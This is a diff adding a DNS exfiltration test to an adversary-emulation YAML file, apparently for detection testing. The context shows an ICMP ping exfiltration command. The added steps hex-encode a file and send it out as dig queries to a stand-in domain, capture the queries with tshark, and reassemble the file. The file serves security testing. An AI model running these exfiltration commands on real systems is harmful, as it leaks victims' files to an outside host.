@@ -110,3 +110,40 @@ atomic_tests:
     elevation_required: false
     command: |
       $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
+
+
+- name: Exfiltration Over Alternative Protocol - DNS
+  description: |
+    Exfiltration of specified file over DNS protocol.
+
+  supported_platforms:
+    - linux
+
+  input_arguments:
+    domain: 
+      description: target DNS domain
+      type: url
+      default: ns2.example.com
+    input_file:
+      description: Path to file to be exfiltrated.
+      type: Path
+      default: ./example.txt
+    output_file:
+      description: Filename of the data exfiltrated.
+      type: String
+      default: received_data.txt
+
+  executor:
+    name: manual
+    steps: |
+      1. On the adversary machine run the below command.
+
+          tshark -f "udp port 53" -Y "dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches ".domain"" >> received_data.txt
+
+      2. On the victim machine run the below commands.
+
+          xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done
+          
+      3. Once the data is received, use the below command to recover the data.
+
+          cat output_file | cut -d "A" -f 2 | cut -d " " -f 2 | cut -d "." -f 1 | sort | uniq | xxd -p -r
